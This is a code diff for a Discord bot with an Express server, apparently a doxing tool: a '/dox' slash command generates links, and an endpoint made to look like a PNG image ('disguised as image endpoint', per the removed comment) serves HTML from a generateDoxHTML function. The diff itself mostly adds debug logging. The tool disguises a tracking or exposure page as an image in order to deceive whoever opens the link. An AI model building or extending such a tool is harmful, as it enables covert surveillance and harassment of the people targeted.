@@ -19,13 +19,19 @@ const client = new Client({
 // ---- STORE ACTIVE LINKS ----
 const links = new Map();
 
-// ---- EXPRESS SERVER (disguised as image endpoint) ----
+// ---- EXPRESS SERVER WITH DEBUG LOGGING ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
+    console.log(`🔍 Requested ID: ${id}`);
+    console.log(`📦 Current links:`, Array.from(links.keys()));
+    
     if (!links.has(id)) {
+        console.log(`❌ ID not found: ${id}`);
         res.type('image/png');
         return res.send('Image not found');
     }
+    
+    console.log(`✅ ID found: ${id}`);
     res.type('text/html');
     res.send(generateDoxHTML());
 });
@@ -37,7 +43,6 @@ app.listen(PORT, () => {
 // ---- DISCORD BOT ----
 client.once('ready', () => {
     console.log(`🤖 Logged in as ${client.user.tag}`);
-    // Register slash command
     client.application.commands.create({
         name: 'dox',
         description: 'Generate a fresh link',
@@ -58,6 +63,9 @@ client.on('interactionCreate', async (interaction) => {
             created: Date.now(),
             user: interaction.user.tag
         });
+
+        console.log(`✅ Generated link: ${url}`);
+        console.log(`📦 Links stored:`, Array.from(links.keys()));
 
         const embed = new EmbedBuilder()
             .setTitle('✅ Link Ready')
